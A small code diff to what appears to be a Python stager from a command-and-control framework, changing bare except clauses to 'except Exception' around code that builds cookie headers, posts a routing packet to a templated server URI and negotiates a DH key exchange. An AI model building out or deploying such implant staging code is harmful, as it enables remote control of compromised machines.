@@ -52,7 +52,7 @@ for headerRaw in headersRaw:
             headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
         else:
             headers[headerKey] = headerValue
-    except:
+    except Exception:
         pass
 
 # stage 3 of negotiation -> client generates DH key, and POSTs HMAC(AESn(PUBc)) back to server
@@ -68,7 +68,7 @@ try:
     postURI = server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
     # response = post_message(postURI, routingPacket+hmacData)
     response = post_message(postURI, routingPacket)
-except:
+except Exception:
     exit()
 
 # decrypt the server's public key and the server nonce
